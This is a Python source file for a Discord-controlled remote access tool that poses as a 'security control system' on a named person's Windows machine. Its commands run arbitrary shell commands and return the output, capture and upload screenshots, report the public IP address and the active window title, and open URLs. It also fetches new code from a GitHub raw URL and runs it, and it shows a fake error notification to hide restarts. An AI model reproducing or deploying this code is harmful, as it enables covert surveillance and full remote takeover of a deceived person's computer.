import subprocess, requests, json, psutil, discord, os, webbrowser, win32gui, pyautogui
from tkinter import messagebox
import tkinter
from time import sleep
from discord.ext import commands
from discord import Embed
from datetime import datetime
from plyer import notification

path = os.path.expanduser("~/Documents")
full_path = os.path.join(path,"aide-system")

with open(full_path+'/data.json', 'r') as f:
    data1 = json.load(f)

token = data1["token"]

def fileDownload(url=str,name=str):
    # Url Raw olarak gerekli
    response = requests.get(url)

    path = os.path.expanduser("~/Documents")
    full_path = os.path.join(path,"aide-system")

    if response.status_code == 200:
        open(full_path+name, "wb").write(response.content)
        print("Dosya indirildi.")
    else:
        print("Url Hatası Mevcut:", response.status_code)


def versionCheck():
    path = os.path.expanduser("~/Documents")
    full_path = os.path.join(path,"aide-system")

    version = 2.1

    response = requests.get("https://raw.githubusercontent.com/bedelcemaxim/XSfdEtApBgJtpy/main/version.json")
    
    if response.status_code == 200:

        data = response.json()
        newVersion = data['version']

        if version == newVersion:
            print('Güncel Version: ',version)
            return True
        else:
            print("Sürümünüz güncel değil.")
            fileDownload("https://raw.githubusercontent.com/bedelcemaxim/XSfdEtApBgJtpy/main/main.py","main.py")
            print("eski")
            subprocess.run(["python", full_path+"/main.py"])
    else:
        print("Versiyon kontrol edilemedi lütfen durumu yetkili kişiye bildirin.")

def createSBT():
    boot_time = psutil.boot_time()
    boot_time_datetime = datetime.fromtimestamp(boot_time).strftime("%Y-%m-%d %H:%M:%S")

    path = os.path.expanduser("~/Documents")
    full_path = os.path.join(path,"aide-system")

    with open(full_path+'/data.json', 'r') as f:
        data = json.load(f)

    data['system-start'] = str(boot_time_datetime)

    with open(full_path+'/data.json', 'w') as json_file:
        json.dump(data, json_file)

    print("[INFO] Başlangıç dosyaları yazdırıldı.")

def systemBootTime():
    with open("data.json","r") as json_file:
        data = json.load(json_file)
        return data['system-start']

def rest():
    notification.notify(title="Hata !",message="Teknik aksaklık nedeniyle güvenlik programı devre dışı. Program yeniden başlatılıyor.",app_name="Gabe",timeout=6)
    sleep(6)
    exit()

createSBT()

#### defler bitti

client = commands.Bot(command_prefix="!",intents=discord.Intents.all())

@client.event
async def on_ready():
    await client.change_presence(activity=discord.Game(name="Aktif"))
    print("Hoşgeldiniz botunuz hazır.")
    notification.notify(title="Hoşgeldiniz İrem Sultan",message="Güvenlik kontrol sistemi aktif.",app_name="Gabe")

@client.command()
async def gabe(ctx):
    await ctx.send("Evet, burdayım")

@client.command()
async def yazdır(ctx,*args):
    string_list = [str(x) for x in args]

    root = tkinter.Tk()
    root.attributes("-topmost", True)
    root.withdraw()
    message = await ctx.reply("> Mesajanız yazdırılmıştır.")
    messagebox.showinfo("Bidirim !", string_list, parent=root)
    await message.edit(content="> Mesajınız okundu.")

@client.command()
async def aç(ctx,arg1):
    try:
        webbrowser.open(arg1)
        await ctx.reply("> Sayfaya yönlendirildi ✅")
    except Exception:
        await ctx.reply(f"> ❗ Hata : {Exception}")

@client.command()
async def durum(ctx):
    sbt = systemBootTime()

    hwnd = win32gui.GetForegroundWindow()
    title = win32gui.GetWindowText(hwnd)

    battery = psutil.sensors_battery()
    plugged = battery.power_plugged
    percent = battery.percent

    if plugged:
        a ="Pil şarj oluyor ✅"
    else:
        a ="Pil şarj olmuyor ❌"

    ip = requests.get("https://geolocation-db.com/json/")
    ipD = ip.json()
    ipS = ipD["IPv4"]

    embed = Embed(title="Durum",description=f"""
        🔸 Çevirimiçi
        🚩 İp adresi: `{ipS}`
        🕔 Bilgisiyar başlatılma tarihi: `{sbt}`
        🔹 Pencere verisi: `{title}`
        🔋 Pil: `%{percent}` *{a}*
    """)
    await ctx.send(embed=embed)

@client.command()
async def ss(ctx):
    try:
        path = os.path.expanduser("~/Documents")
        full_path = os.path.join(path,"aide-system")

        pyautogui.screenshot(full_path+"/screenshot.png")
        sleep(1)
        file = discord.File(full_path+"/screenshot.png", filename="ss.png")
        await ctx.send(file=file)
        sleep(1)
        os.remove(full_path+"/screenshot.png")
    except:
        await ctx.send("Hata ScreenShot alınamadı ❌")

@client.command()
async def cmd(ctx,*args):
    try:
        output = subprocess.check_output(args, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        await ctx.send(f"```{output}```")
    except Exception:
        await ctx.reply(f"> ❗ Hata `Program yeniden başlatılıyor...`")
        rest()

@client.command()
async def restart(ctx):
    await ctx.send("> Komut yürütüldü yeniden başlatılıyor.")
    rest()



client.run(token)
